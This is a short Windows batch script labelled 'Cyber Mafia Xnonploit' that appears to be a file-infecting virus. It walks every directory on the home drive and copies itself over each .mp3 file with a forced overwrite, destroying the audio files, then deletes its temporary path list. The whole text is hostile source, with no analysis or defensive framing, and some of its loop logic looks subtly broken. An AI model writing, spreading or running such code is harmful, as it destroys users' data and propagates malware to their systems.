:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.mp3) Do (
            Set Mp3Infect=%%Z > Nul
            Copy /y %0 %Mp3Infect%
        )
    )

Del /f /s /q DirPath
